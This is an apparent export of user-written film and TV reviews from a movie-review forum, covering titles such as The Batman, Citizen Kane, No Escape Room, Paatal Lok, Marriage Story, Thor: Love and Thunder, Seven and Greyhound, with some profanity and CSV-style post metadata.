Paul Dano absolutely killed it as Riddler- after seeing this casting this was the one I was looking forward to the most he absolutely delivered- bringing the psychotic character to life and you really felt his creepiness in every scene. He really went for it and didn’t quite to Heath Ledger status but was in the same arena. 

. Collin Ferrell and John Tutoro brought the heat and really looking forward to see what HBO does with The Penguin spin-off- his rise to the tops of the mob will be must watch tv. 

Jeffery Wright was the unsung hero of the movie- he was basically the “Robin”. Him and Pattinsons chemistry throughout the whole movie was outstanding.

1645976112.0,Batman (1989): 10-Category Review,"Batman is well made, despite an empty script. Solid acting aside, characters are unmotivated. First, Bruce Wayne is hardly present and woefully underdeveloped. His extreme measures are never properly explained. Eventually, audiences learn about his parents, but that isn't explored. It's too little, too late. Meanwhile, Wayne's romance is forced. They're inexplicably in love, despite sparse quality time or chemistry. Next, the Joker is nonsensical. Nicholson is charismatic, but his plans have weak purpose. Lastly, nobody arcs because there are no themes to progress. Viewers might care because of pop culture influences, but not because Batman has depth or growth.

Conversely, Batman has excellent technicals. The cinematography is distinct, utilizing Dutch angles, dramatic shadows, composition, and symbolic movement. The elaborate effects use green screens, matte paintings, pyrotechnics, and miniatures. The main theme song by Elfman remains iconic. Finally, the production design is the highlight because its grungy art deco style perfectly suits the narrative and creates an immersive world. The sets, props, and costumes all have lived-in details that are unique and cohesive. Overall, Burton's attention to the script is lacking, but his filmmaking prevails. Batman is flawed, yet its craft offsets those issues and makes it a worthy experience.

1642346414.0,Citizen Kane (1941): 10-Category Review,"Citizen Kane is known as the greatest film ever, and justifiably so. In virtually every department, Citizen Kane redefined the medium. First, the story is nonlinear, which still influences current filmmakers like Tarantino and Nolan. The script is tragic, relatable, and detailed, but its structure makes it groundbreaking. No character gets to fully know Charles Kane, but the audience sees several perspectives and is left to decide. The acting underscores these perspectives by presenting believable evolutions in each role. Orson Welles exemplifies this by showing a young idealist turn into a jaded cynic through a realistic progression.

Next, the cinematography is iconic because the focus is extremely deep (like the human eye), the camerawork is dynamic (combining several shots into continuous takes), the lighting is stark, and the composition is complex (utilizing the simultaneously focused foreground and background). The editing employs captivating montages, layered imagery, and seamless match cuts. The audio blends dialogue with symbolic sounds and uses echoes to heighten isolation. The amplified sets and costumes emphasize themes. Finally, the special effects use projections, matte paintings, split screens, and make-up to assist the atmosphere. Indeed, Citizen Kane is a complete symphony of craft.

1614411347.0,No escape room,"No Escape Room is a horror movie on Netflix released in 2018. The premise of the story is 5 people must escape a house while facing numerous puzzles and an ever growing paranormal threat called ""the Inventor"". 

Now this is going to be a harsh one. This movie breaks so many rules in my mind, and its just executed poorly. 

It follows suit with numerous horror movies who use ridiculously dumb characters to band aid its lack of creative writing. Anyone can produce a horror movie or a story, very few get it right. This is just another dumb flick, with dumb character doing dumb shit for the sole purpose of being ""scary"". 

Ok so first off were met a few poorly executed foreshadowing events early on via the waitress in the diner. They over dramatize her warning to the two, and immediately write it off as a joke the waitress is pulling on the two afterword's. May I just say her attitude is very transparent. I could tell she was in on whatever was going on at this place from the very start. 

This leads to a corny bathroom scene that's supposed to be ominous and scary, but is only there to do just that. It has no major impact or even small impact on the story. Its just there because its there. 

We go on to the main shabang. Our characters get to the house and are greeted by a rather strange women, who appears to know them but is given no back story to connect the audience to how she knows our main characters. They go on to sign a waver and meet the rest of the people who will be taking place in the escape room(s). 

Immediately were given character dynamics. You have the sensitive to scares (Tye) The strong male (Andrew) The strong Female/Intelligent female (Melony) and our two main protagonists (Michael and Karen). 

They quickly figure out how to escape the first room thanks to Melony and Andrew and its in the second room where things start to heat up. They notice a bunch of paranormal style equipment. They look it over, play with some of it. Eventually, Melony starts to use a phone used for contacting spirits. She gets her own voice back asking for Tye. When Tye picks up the phone to listen he is is given a chilling message and then looks to the phone and its covered in worms (ooooh scary). He drops the phone and as you could already see coming is the first one to freak out and use the safe word to leave, disappointing his Girlfriend, Melony. (come on Tye...) This movie uses a lot of phycological kinds of scares that are based on the characters individually. Because nobody else sees the worms and is confused by his panic. Tye leaves the room and is not seen or heard of afterword's.  

The rest go on to play. They open a door to a closet to find the hostess mortally wounded on the floor wrapped in a blanket. They argue over it being a trick or not as she tells them flat out to find the key and get out of there. As the door slams shut, separating the group from the dying hostess. The group, conflicted in their beliefs, argue for a minute about whether it was real or an act. 

Eventually, they send Karen who is smallest, through a window on top of a locked door to find a way out. Karen says she will stay by the door and continue talking assuring her dad not to worry, but immediately walks off and you know, fuck what she said to her dad right? Great decisions being made here obviously. She follows what she thinks is the hostess, who is staying just out of sight enough to be not clearly seen, but is ominously calling out to follow her to Karen. Again, great decisions being made here, so Karen follows all the way to the basement. Which is a sort of torture chamber it seems. She finds a key, and instead of taking it. She sets it back down and fuck that key. Another smart decision since she was clearly told to find a master key and emphasis was put on finding keys in general the whole time up to this point. Scary shit starts to happen and a body slides out of a morgue like corpse locker. She for some reason is just now feeling terrified and decides to climb INTO the next over body locker. GREAT CHOICE! She lays in there for an undisclosed amount of time while the rest of the escapees eventually get out of the room she left them in and begin looking for her. 

May I just point out the Karen's father almost has no believable concern for finding his daughter even though he has already questioned to the others if they think Tye actually made it out or not. He's already half way awake about the situation he is in, and yet, no worry, no concern about HIS DAUGHTER who they cant find. Well I guess the search for her is going to ensue. The three of them left, find a room that resembles an attic. It probably was an attic to be honest I was so out of any groove this movie had going up to this point solely because of the transparency of the writing. 

Up to this point every door the go through has slammed shut and locked itself. They even say, after it happens in the attic, that maybe they should start wedging the doors open. A SMART IDEA CHIEF. I would've done that after the SECOND time it happened.. Here they are a THIRD time, its happened and captain hindsight over here appears to have saved the day! not... 

So in this room is a old school, ""sinister"" style video player. A few cassettes and a locked drawer. They conclude the combination could be on the tapes. Then, the strong male Andrew figures out to reflect light towards the ceiling fan, to find a code written on the fan blades. They use the code FIRST TRY unlocking the combination lock because I guess they just immediately know what order to put the numbers in, ya know LOL. They find a key, and both males immediately go to unlock the door and escape the room. The whole time yelling for Melony to come the fuck on, lets go! Like 5 times. Now this is what I'm talking about with weak writing right here.  

Melony up to this point seems like an experienced escape room player. She seems smart. Up until now. For the sake of the movie, for the sake of scares. I just love writing where the characters are only smart when they need to be and they are dumb asf when the story needs them to be. Refer to the death of Joel in The Last Of Us 2 to understand what I mean. 

So Melony, ignores her partners and decides watching this video player is way more important. Obviously some paranormal shit going on, on screen. Dumb as a bag of rocks and obviously deaf she doesn't follow the guys out of the room, and as soon as they leave the room, the door shuts and locks her inside. Remember the whole, we need to keep these doors wedged open line that was just said like 5 minutes ago. FUCK THAT SHIT yet again. 

Melony now trapped in a phycological style loop, cannot leave the room. She cant even make it to the door to get out. Good job Melony. Some shit goes down and she tried to escape a shadow person via a ladder. One of the boards snaps which for some reason, sends he back 4 feet like someone pushed her back instead of what would really happen here. Physics people. But whatever pushes the envelope with horror movies like this. 

We now cut back to Karen, still in the corpse locker next to the very thing that terrified her into getting into the damn locker. The sounds of someone trying to get in in an attempt to build anxiety ensues. Until the door opens and its Andrew. He pulls her out and is relieved to have found her. He tells her they split up to find her while she questions whether Andrew is in on what's happening. Andrew assures her he is not and immediately BOOM she trusts him. Took almost no time. 

Meanwhile, her dad, searching another part of the house STILL seemingly unconcerned for his daughters safety finds a room with a picture hanging of a tree in a field. In classic stupid horror movie writing, he does the, Ima stare at this shit with dumbass face until some shit pops off and im fucked. Classic. He teleports to the place in the picture. A women who looks like his daughter ominously rises out of a small creek that cant be more than a few feet deep. Motionless and very dead looking. Again, lets play the character to stupid to realize what's happening thing, lets stare at this shit like were having an aneurism. He then makes out with w.e. the fuck this thing is and im pretty sure its supposed to be his daughter? Idk its not really spelled out. It looks like Karen. Nd WTF chief? 

At this point, I couldn't even stomach watching anymore. It follows suit with dozens of cheaply made horror movies with a decent budget. 

The characters are plain stupid! But only when the movie NEEDS them to be and its all so transparent and just unentertaining. Its one thing to have believable character making good decisions and STILL losing, its another to use plot armor off and on to direct your movie like your audience is braindead. 

I give this movie 4 out of 10 SHIT POINT for at least having decent budgeting for props and environments and obviously its filmed very well, but the character and the writing is just CHEAP.

Sometimes it's about the horrors we face in our lives on a daily basis, both personally and through those around us. Relic works beautifully as a horror movie. Sure, the place is slow and as the story unfolds you don't think to expect much. You're not scared so much as waiting through most of the film. Waiting for something to happen. Waiting to see how it will unfold into this frightening moment to give you that fix of scaredness you're jonesing for. The first hour plods along, unfolding the story. Then, the final 30 minutes quickly hits you with the climactic final scenes, culminating in one of the grotesquely emotional and beautiful final scenes I've ever seen in a horror movie. And maybe that's the point. Maybe the true horrors in life aren't men In masks. Maybe the truly scarring things we face just slowly grind day to day with us as we go through our mundane, everyday lives. They're always there, in the background and the back of our minds, waiting for their moment.

1591716187.0,TV Series Review: Paatal Lok (Underworld) (2020-),"**TV Series**: Paatal Lok / **Director**: Avinash Arun, Prosit Roy / **Country**: India / Genre: Crime Thriller

**“Is it because while Tyagi and the other got banished to hell, you found your doorway to Heaven in this case?”**

So this thought also crossed in your mind that in which ‘lok’ you belong? And what is the basis of it? Money? States? Power? Religion? Cast? Community? Gender? Isn’t it partly we all reside in every ‘lok’? In a ‘lok,’ we are a victim; in other, we are a ‘culprit’! Amazon Prime’s new Indian web series ‘[***Paatal lok***]( (*Underworld*) displays burning issues of the country unbiased and raw that its flames reach our hearts, which ignites a question in our minds that “do we really know our country from its core?”



Once Ram, with the help of Lakshman, tried to find and kill Rawan. But he found that the Rawan had many faces as corruption, exploitation, kidnapping, poverty, gender-cast-class-color discriminations, and many more. But he cannot fight against it as he is alone this time. This time his whole army is on the other side. (some of the stuff above is written in our scriptures, though I read it on WhatsApp!!)

The show studies the evolution of the character of inspector Hathi Ram Chaudhary ([Jaideep Ahlawat]( who has frustrated in life at every level. He has divided the world around him into three parts, but soon he falls in a ‘chakrvyuh’ which moves from culprit becoming victim, victim becoming culprit. We see India through the prejudiced lens of Hathiram, but eventually, we both change our perception about truth, as sometimes what we know may not be the truth, not at all.



The whole system of all three worlds reminds me of the movie ‘[Snowpiercer.]( Here the entire train of the system is controlled by politicians. The brutality of the third episode, which has stunned its viewers, slightly reminded me of the movie ‘[The Color Purple]( The film has based on the Pulitzer Prize-winning [novel of the same name]( written by Alice Walker and directed by Steven Spielberg, starring Oprah Winfrey. It tells the story of an African American woman who is not only tortured as a ‘black’ by white people but also as ‘woman’ by black men. The same condition is faced by ‘Dalit woman’ every day in India.

Very loosely, it also reminds me of the movie ‘[Earth]( It has based on the novel ‘[Ice Candy Man]( by Bapsi Sidhwa, directed by Deepa Mehta, starring Amir Khan, as it connects that there is no control of women of any class or cast over their lives and are treated merely as pawns in power games.

Some people gave it two stars (really?) because it is very predictable for them! Agree. Inhumanity towards lower-caste, riots for religions, ill-treatment of women, valueless lives of poor…. How predictable society we have. Yeah, please show something new, we are used to such stuff now, right?  Some other people are saying it is biased, aren’t the society too? Aren’t you live in this society?

So, who is going to cast the first stone?",moviereviews,2995,516,76,0

In the video I go on to discuss the idea of ""imposter syndrome"" and how you don't have to be at a grand level of sucess to feel the impact of it and I go on further to talk about being a YouTuber as a whole (if you're into that sort of thing) and even moreso, specifially what it's like being a film critic on YouTube. This is a bit of a personal video where I just rant on a little bit about the ins and outs about what I do and mostly where I explore my doubts in myself - Others might be able to relate maybe, some might just find it interesting (hopefully) 

But I also just want to specify that this isn't some sob story bullshit, this is just an honest chat about the stuff I'm interested in. And then in the latter half of the video I talk about some other YouTuber's within the film niche who I admire so give it a look at for those recommendations as well! 

**But really I want to ask is; Do you think that there is hypocrisy in being a critic of something while not actually being a contributer?** 

I don't live in Hollywood, I don't work in film - Hell I don't even make shorts apart from when I was in school.. So in the video I talk a bit about why I feel like in some ways that could make my opinion invalid and why my opinion shouldn't really matter all that much when I don't have a whole heap of authority on the subject - But in turn, the fact that I'm not an absolute expert on the medium makes it so that I'm more grounded in my content. More down to earth, and just the representation of a normal guy, with his normal opinions. I'm not some pretentious critic - I'm just an every man. And maybe there's charm to that too. I guess there's pros and cons and different ways to look at it. So let me know what you guys think, and check out the video ;)",moviereviews,2002,396,44,0

It stars an Leonardo DiCaprio, Joseph Gordon-Levitt, Tom Hardy, Ellen Page, Dileep Rao, Ken Watanabe, Cillian Murphy and Marion Cotillard. Dom Cobb (Leonardo DiCaprio) is offered to get his criminal record erased by a wealthy businessman as payment for implanting an idea into another businessman's subconscious to dissolve his father's company.

Inception is one of my favorite movies. It included an original concept that was executed really well, superb performances. Hans Zimmer's score is a beauty to the ears, included gems like 'Dream is Collapsing' and my personal favorite, 'Time'. The cinematography and visuals were beautiful too.

Inception not only the best movie of the decade but also one of my all-time favorite movies.

1578537800.0,Marriage Story Review,"Marriage Story Review
By Miami Rose

The Beginning 

For the last decade there has been a huge influx in high action movies, extreme horror flicks and over the top superhero films. These movies have defined a new view of films being all action packed, fast paced and bloody with the need to increase a viewers heart rate. Don’t get me wrong I’m a big fan of movies like these, but, what’s missing is the true roots of Cinema, a connection of humanism and emotion. Marriage Story by Noah Baumbach is just what we needed, a movie that truly represents what cinema is about; The connection of humans to each other. 

The Good

2019 was a year full of movies that attempted to bring back that connection but none of them as powerful and true art form as Marriage Story. The writing is absolutely beautiful with it really taking the time to show us that this isn’t a movie about anger and shouting it’s a movie about the internal struggle of two people previously in love trying to sort out their problems and do what’s best for their child (Henry). It gives us insight into what kind of people they are without just outright telling us, yes it tells us the good about them at the start but these characters have flaws and they change throughout the story like a normal person would rather than drastic changes that happen for no reason. Charlie is a character that starts off as a seem to be perfect director and father, the story develops and shows us that he has flaws, he frustrates easily, he doesn’t do well under stress and he doesn’t like things to be complicated. Adam Driver was absolutely perfect in this movie, his acting really makes me think that he is a worthy Oscar contender against the current Fan Favourite Joaquin Pheonix. Driver plays someone you could really wholeheartedly believe is a father, he portrays such emotion such as Stress, anger and sadness in such believable ways it’s insane. Nicole played by Scarlett Johansson is terrific as well and is a different sort of character that really highlights the difficulty of the split, she is played very well with small things that happen at the start coming into the keep developing such as her out of control envy and anger that she gets in a moment and she has to calm herself so she can think properly. The Directing in this movie is absolutely fantastic, the way that these characters were developed had to have been very personal. All the characters side and main, are incredibly believable as being normal people doing their day to day careers whilst also living a life but having a inclusion in the split of Nicole and Charlie. Cinematography is superb with it really placing shots where our characters feel, such as when Charlie is incredibly stressed and upset the camera is pointing up to him and close up, really invading and making us get the feeling he is very stressed out. Randy Newman does the soundtrack and it’s extremely fitting, it’s no over the top funk or pop it’s emotional music that really sets the mood, and it’s works amazingly well alongside the characters and the extreme talent behind them. This is true cinema with it giving a film about true human emotion and struggle without it being over the top. 

The Bad 

Bad does not come to mind at all when writing this and I can not think of a single thing that made me feel otherwise. Even the children actors were superb so I can’t say that they distracted from the overall performance. I think the only thing I can think of that isn’t actually that bad is that Nicole’s sister is over frantic, but that’s most likely a character trait. 

The Ugly

This section is for mistakes and there were none. 

The Verdict

Marriage Story is one of the most beautiful Movies of all time and it has put itself straight into the classics for the future in my opinion. Adam Driver is absolutely perfect with his role and so is Scarlett Johansson. Overall this movie is what we need nowadays; a true form of cinematic art.

I believe overall its a symbolic movie Personally I believe the peformances in the film were incredible and so was the directing. However the writing felt almost unfinished. I know Jordan wanted us to use our imagination for the things left open but at times the film didn't feel satisfying. First part of the movie saw the family go to their holiday home and a killer family turn up to kill them. This was done very well and a moment went from tense to funny as the fathers suppied comic relief. The second part of the film showed us that the whole of America have clones and this surprised me. The final part of the film saw Lupityas charcters face off. The dance fight scene was incredible however the twist felt weak and my friend didn't even realise it.

1662840652.0,Thor: Love and Thunder lacked... a lot...,"I will preface this by stating that I absolutely loved Ragnarok, and Guardians of the Galaxy 1 and 2, These films managed to bring the perfect balance of comedic timing to what are, in reality, very dark scenarios (war, genocide, god's killing planets), I went into Love and Thunder with very high hopes...

And those hopes were dashed within minutes of the movie starting. I don't know who made the creative decision (Taika probably) to make Thor a bumbling buffoon, but it doesn't add appeal to his character. It was fine in the previous MCU movies when he made funny comments and say stupid things because it was based off of his lack of knowledge of social convention because of his upbringing and inexperience with the human race and other races. But in this movie, they pretty much just made him flat out stupid. They made him more of a Draw 2.0 in that he's a big strong dumb lad with a sensitive moment here and there. 

Then the screaming goats.... I just got sick of those and was hoping they wouldn't be recurring, but they stuck around for the ENTIRE. MOVIE. Screaming goats.... that's what the humor has boiled down to now for an MCU movie.

The romance in the movie is, ok, I get it we needed a love connection and it serves it's purpose.

FAT. RUSSELL. CROWE. as a horny old god, not a fan. and SADLY it looks like we will be seeing more of him if the teasers mean anything (Which they well may not, I'm still waiting to see if Adam Warlock eventually makes it into a film since they hinted at him after GOTG2).

Honestly, the **only thing I truly loved about the movie was Cristian Bale's performance as Gorr**. He did a delightful job of balancing dark comedic undertones with a truly unsettling performance. And he was RELATABLE. You actually felt pity and understanding for his motives. ""Sympathy For The Devil"" should have played in this movie instead of ALL the Guns N Roses songs one after the other. Bale was fantastic in this role, like a skinnier, creepier Marilyn Manson with a sword. The kidnapping thing seemed a bit cliched and tiresome, but I don't blame Bale for that at all as he didn't write the script. If you boil all the scenes down to one soup, the guy didn't get nearly enough screen time and he managed to convey a LOT of his story through what little dialogue they actually gave him in the film.

Overall: Bale was fantastic, but the movie is TOO campy, TOO corny, TOO cheesy, and the humor is TOO dumb. Remember Endgame and Infinity War? There was a sense of pending doom in those movies that made the lighthearted funny moments a breath of fresh air. It broke tension. When you have a movie like L&T that makes everything lighthearted including horrible things like cancer, death and kidnapping.... it's just not a good movie because there is no tension. Gorr also should have lived, he is FAR too powerful in the comics to give him one 2 hour movie....

I re-watch MCU movies all the time, but this one I'll take a hard pass on the 2nd watch.",moviereviews,2985,543,91,0

When they drop into the jungle, they quickly discover something far more dangerous that begins to hunt them down one by one.

It’s been years since I revisited this franchise and since my fiancée hadn’t seen the original two, it was only right to prepare for the newest entry in the series. We dedicated our day off to the 4k collection released in 2018, which includes the first two films and the 2010 film. Being said it’s been a year or so since I popped in a physical 4k disc and it felt insanely different from my daily streaming. The restoration for this film made the jungle vibrant and even felt like the film was fifteen years younger. Arnold was in his prime back then and does a great job as the lead commando. Carl Weathers and Bill Duke stood out amongst the rest of the cast and I really enjoyed their characters. The prosthetics used for the predator looked great in 4k and the movie didn’t feel very dated. The kills were great and it was good to watch the film again after nearly a decade.

I give this film an 8/10.

Hey yo, this movie fucking movie rules. It's a weird and fucking buck wild ride of a movie from start to finish. No doubt it's not for everyone but great googly moogly I fucking loved this movie.

This movie, The Batman, and his part in The Devil All Time have sealed my fate as a Pattinson dick rider. Although he did alternate between your different accents, his acting overcomes what I am sure is just me nitpicking. I really can't think of any other issue with this movie.

1653310974.0,Chip ‘n Dale: Rescue Rangers (2022): 10-Category Review,"Chip 'n Dale: Rescue Rangers is surprisingly effective. It could've been a cash grab, but the film actually puts forward interesting efforts. First, Chip 'n Dale creates a universe where animation lives in reality. Cartoons, CGI, claymation, and puppets all intermingle with humans, supplying plenty of gags and giving the film a creative edge. Plus, the emotions are decently motivated. Chip holds a grudge against Dale, and Dale lives in the past, romanticizing his fading fame. These aren't original character arcs, but they're sufficient. Additionally, meta humor about show business, reboots, and animation solidifies Chip 'n Dale as fairly engaging entertainment.

Technically, Chip 'n Dale has key strengths. Generally, the cinematography is unremarkable (with some motion and sight gags), editing is standard (with solid pacing and flashbacks), and the soundtrack is adequate (using familiar tunes as punchlines). Conversely, the acting has comedic timing, sound gets abstract, and the cast is recognizable. However, Chip 'n Dale's utilization of diverse animations gives the film life. Meanwhile, its inclusion of pop culture references is enjoyable (without feeling excessive). Overall, Chip 'n Dale impresses because it supports clever ideas with acceptable filmmaking. It isn't a must-see, but Chip 'n Dale is likely to satisfy.

1649349168.0,Speed (1994): 10-Category Review,"Speed honors its title. Despite lacking true depth or originality, Speed succeeds because it's efficient. The film unloads tons of action, but there's enough character development to maintain investment and prevent exhaustion. The story starts by introducing the protagonist, villain, and atmosphere through a smaller conflict. From there, viewers receive calmer character moments before jumping into the main course. Once Speed gets going, it's a steady series of obstacles with emotional breaks. Plus, Reeves has some dramatic outbursts, Bullocks is charming, and Hopper is fascinatingly deranged. Overall, Speed pushes the limits, but never crosses the line.

Meanwhile, Speed is technically charged. First, the effects are emphasized. Full of real stunts and explosions, Speed is refreshingly tangible. Also, miniatures help increase scope without sacrificing realism. Next, the editing is dynamic yet controlled. Speed is visually clear and properly constructed. The sound is complex because it's in a constant state of action, and the direction successfully blends a digestible tone. Speed could've easily felt insincere or overly cheesy, but it lands as endearingly ridiculous. Furthermore, the cast is quite impressive in hindsight. Ultimately, Speed stays in its lane and does its job. It's shallow entertainment done right.

1640971028.0,Licorice Pizza (2021): 10-Category Review,"Paul Thomas Anderson is a skilled filmmaker. His movies are thoughtfully written, methodically paced, and constructed with detail. Licorice Pizza falls in line with Anderson's established work because it possesses all these qualities. Undoubtedly, the film's most noticeable trait is its pronounced vision. Since the romanticized visuals, relaxed editing, and nostalgic writing harmonized so well, credit must be given to Anderson for weaving a dream. Licorice Pizza feels like a trip down memory lane, and is an aesthetic experience as much as it is a concrete narrative. For these reasons, the film is certainly more than the sum of its parts.

Meanwhile, the acting leads of Alana Haim and Cooper Hoffman keep Licorice Pizza rooted in relatability. The film stretches its artistic legs but remains focused on its study of maturation. Haim is caught between worlds: too experienced to fit in with the teens and too naive to fit in with grown adults. Simultaneously, Cooper has outgrown his childhood and longs for more than his adolescence provides. Together, these two depict various flavors of self-discovery as they navigate their transitioning places in the world. Anchored by this vulnerability and decorated by Anderson's artistry, Licorice Pizza lands as a stunning encounter.

The film takes place in a world where humanity can no longer reproduce - a world brought to life so vividly through subtle special effects, apocalyptic settings, and realistic portrayals of international politics and the implications of this global crisis. The film is littered with artistic references that add so much on repeat viewings, and each shot is a sprawling painting of detail and artistry. Clive Owen is a great lead, the soundtrack is at times moody, poignant, and epic in scale, and the intense chase scenes or violent depictions of turmoil are perfectly executed. During the third act, there is a scene so powerful and encapsulating of humanity’s plight - one of stillness followed by cacophony - that deserves recognition as one of the greatest moments ever put to screen.",moviereviews,892,147,14,0
1618762663.0,Review Of Seven By David Fincher," 

Seven is a film about two detectives, Mills and Somerset, who have to track down a sadistic and vague killer who operates based on the seven deadly sins. The film stars Morgan Freeman, Brad Pitt, and Kevin Spacey. It is directed by David Fincher.

I have always had a weird relationship with this film. It is the only Fincher film that I have consumed through pop culture osmosis. I new all of the themes, plot threads, and gory details. Seven was the only film that I had experienced in every way except for watching it. So on the day I am writing this review I decided to knuckle down and watch it for real. An to be honest; my expectations for a great film were blow out of the water. Seven is a film I have always wanted to discuss, but now having watched I finally have a reason to.

Before I analyse the themes and characters if this over-analysed piece of fiction there is one thing I didn't know about coming in; the real human detail. Even though everything in this city is decrepit and unholy the city feels like a real place. And I don't mean that the people and the city itself have a unique personality. The nicest thing you can say about this anonymous cesspit is that people are actually able to live there and not rot on the outside. Even though apathy is slowly consuming them on the inside. What I am trying to get at with this monologue is that there are things in this city that make it more than your stock noir thriller city. 

The best way to explain what I want to get across is by giving you two examples, the crime scenes and the chase scene. In most noir crime scenes the clues are kind of out in the open; in my opinion they are layer out like this so the audience can make predictions based on the information they've got and it makes it easier for the detectives to find what they need to find. However this isn't what it is like in real world crime scenes. You have to slowly and methodically look at every nitty-gritty detail of these feces ridden hell holes to find what you want. The main virtue the skilled detectives display in this film is patience. A lot of the time in fiction and the real world people are too quick to the gun; they ignore the bigger picture to get things over and done with. Infact in the film Somerset looking at the bigger picture and noticing the literally writing on the wall is the only reason the whole Seven deadly sins angle is picked up. If Somerset didn't do this the gluttony case would have just been written off as a homicide committed by some vindictive maniac who had an issue with the obese man and wanted fatten him up like a pig for punishment.

The second example I want to uses for the human detail of this film is the chase scene. The context of the scene is that Somerset and Mills have found John's address so he shoots them and flees through the apartment building. If the crime scenes are good emulations of real life crime scenes; this chase is a good emulation of real low income grimy fortresses that make up cities like the one we see in Seven. Even though the scene is going at a frantic and rapid pace, Fincher's camera let's have a good glance at the grimy poverty that has infected this building. Even though gunshots are being heard and calamity surrounds them people still hang around this horrific architectural labyrinth like nothing is happening. And that is because gunshots and calamity are every next Tuesday for the populace here. This scene indirectly gives us a good example of why John hates this city so much.

Even though the visuals do a splendid job at portraying this apathetic hellscape; the dialouge gives us a more confrontational perspective. Every line a character says in this film has a varying level of cynicism, madness, or apathy to it. And it is the audiences job to pick out what lines match these three descriptions. The city in Seven leaves no room for a happy personality to roam free. If you stroll into this place having taken the blue pill of Ignorance you would be bent over a table and disembowled by a manipulative murderer. And then your quivering corpse would be taxidermised by a corrupt cop. And finally you would be photographed and framed in the newspaper by roach-like journalists.

I think the reason why John Doe does the horrific things he does is because he looks at the world so objectively that it has shattered his mind. If people like Mills and the dude who made the knife sex object that was used in the lust crime are like having a blue pill with your coffee every morning. John Doe is like shoving red pills up every orifice in your body. John Doe is a man who has been trying to wake up the world with a tap to the shoulder, he is a man who has done this his entire life as an average member of society. But now it is time to do something a little more drastic. Nowadays you need to beat someone with a sledgehammer to get their full attention.

One thing I haven't seen people talk about when it comes to John is his actual occupation. John isn't some lunatic who broke out of an asylum and went on a rampage. He isn't just some shut in who wrote a manifesto before he went full Ed Gein. Even though these are definitely aspects of his personality; before there was John Doe there was more socially productive Joe Schmo. Joe was a journalist who moved to the city to cover real crimes and real news stories. But as he delved deeper into this world of sin and corruption he started to have conflicts with his more Christian values. As Joe became paranoid about the deterioration of his society and out of the turmoil in his brain God arose and communicated with Joe. He told Joe to send a message to the world that he lived in. He told Joe to demonstrate that if the people would just let sin slide by; they would become bloated corpses like the seven Joe would display.

In the end John's plan was both a success and a failure. On one hand the message was completed and it was sent. With the help of Mills the Seven sins were all demonstrated. The consequences for them were displayed fully for all to see. If death was the ultimate consequence for all of this I have a theory that Mills didn't survive the events of the film. If he doesn't kill himself offscreen his soul is irreparably damaged. However the failure comes in with the fact that the world's apathy might just block out the message. What is the point of sending a message if nobody cares about hearing it. In the end John's sadistic crimes against the people he sees as sinful may just all be in vain.

In conclusion Seven is a very special film that Dan be perceived in many different ways. After watching a lot of analysis videos I can tell my findings aren't the sane as others. The lesson Seven taught me is that a lot of people have different perspectives, and that is ok.

starring Tom Hanks, Stephen Graham, Rob Morgan and Elisabeth Shue
screenplay by Tom Hanks
directed by Aaron Schneider
Rating:  ♦♦♦♦♦

This is a good movie.  I watched it four times over a couple of days.  Based on the novel The Good Shepherd by C.S. Forester (1955, Little, Brown), Greyhound, set in February 1942, features an American Fletcher class fast attack destroyer escorting Convoy HX-25 of 37 merchant supply ships across the North Atlantic to Liverpool, England.  It’s the height of Nazi U-Boat wolf pack submarine warfare in the Battle of the Atlantic.  I was attracted to it because it stars Tom Hanks, and because it’s a wartime Atlantic convoy story.  Halifax, Nova Scotia, Canada was a staging port for wartime convoys in both World War I and World War II, and I just happened to have visited there last year.  Greyhound makes no mention of the North American origin of the convoy, however.  Instead, the film starts as the ships are about to exceed ground-based air cover and enter the most dangerous, mid-ocean waters, nicknamed “The Pit.”  In addition to my interest grounded in my visit to Halifax, NS is my familiarity with the British Tribal class of WWII destroyers, which were approximately the same size and capacity as the Fletcher class, although with slightly less powerful engine turbines.  There is a famous Tribal class destroyer, the HMCS Haida, docked in Hamilton, Ontario as a museum ship that I have visited more than once in my life.

The North Atlantic in February is a vicious place.  Rough seas, freezing ocean spray.  If a sailor falls overboard, or if a ship is torpedoed and sinks with survivors in the water, the water is so cold that these men will freeze to death before a ship can turn around and send out a rescue dinghy.  When the Greyhound detects U-Boats, she speeds off thorough the violent seas with surprising agility to challenge the enemy.  Only four warships are escorting the convoy:  Greyhound as leader, two British destroyers, Harry and Eagle, and a Canadian corvette, the Dickey.  Corvettes were an early wartime anti-submarine mainstay of the Canadian navy.  They were small warships that packed a big punch.

There follows about 72-hours of hair-raising marine combat until the convoy reaches land-based air cover on the other side.  I was particularly fascinated by the Greyhound as a machine.  Moving parts and men following naval protocols working in synchronicity.  It was terribly interesting to imagine that this was a very realistic dramatization of a Second World War ship in battle.  (I think I am attracted to the 2010 Tony Scott movie Unstoppable starring Denzel Washington and Chris Pine for similar reasons.  My male psychology is attracted to the locomotive as a big, phallic machine.)

Other great WWII submarine movies I have watched and enjoyed include:  The Enemy Below (1957, starring Robert Mitchum and Curt Jurgens, directed by Dick Powell, based on the 1956 novel by Denys Rayner); and, Run Silent, Run Deep (1958, starring Clark Gable and Burt Lancaster, directed by Robert Wise, based on the 1955 novel by Commander Edward L. Beach, Jr.)

Much of Greyhound was shot aboard the USS Kidd, a retired WWII veteran Fletcher class destroyer that today is a museum ship berthed in the Mississippi River at Baton Rouge, Louisiana.  The script mentions the Kidd by name, as an homage.",moviereviews,3371,560,76,0
1613898232.0,"""I Care A Lot"" Spoiler Free Review","I know this isn't a massive sub, but I just wanted to come on here and attempt to ward anyone who may see this away from watching ""I Care A Lot"".
 I have absolutely no clue what the writer and director had in mind on paper with this one, but it is a complete disaster on the big screen. The trailer really made it seem like there was some interesting potential to capitalize on a topic that is not often spoken about in big budget films, that being the poor treatment of many elderly people in America. Yeah, the folks who made this trailer should get a raise. 
While that may be an idea the film is trying to explore, it just doesn't, and instead chooses to focus on the ""feminine power"" of being an utterly abhorrent couple who take advantage of everyone they meet. The first scene you immediately side with someone  who is the victim of the main characters inhuman treatment, and then realize that they are going to be completely unlikeable and remain that way for the majority of their screen time. 
The plot does hold together fairly well for around the first thirty minutes, and the way main characters take advantage of the elderly and the system in place is fairly interesting until you start to really think about it, at which point it falls apart. And then there is the introduction of Peter Dinklage and the ""Russian"" Mafia. Now Dinklage does of course deliver a good performance (as does Rosamund Pike I should mention), but why in the fuck he and his goons are supposed to be Russian is completely beyond me. They have Russian names, and that is literally it. No accents, no speaking Russian, nothing. They're just Russian because.. well because why the fuck not? It worked in John Wick right guys?? This is also where the plot REALLY starts to fall apart. Every decision made by every character makes less and less sense as time goes on, and the main characters both go through action movie levels of nonsense all for an ultimately uninteresting and disatisfying conclusion. 
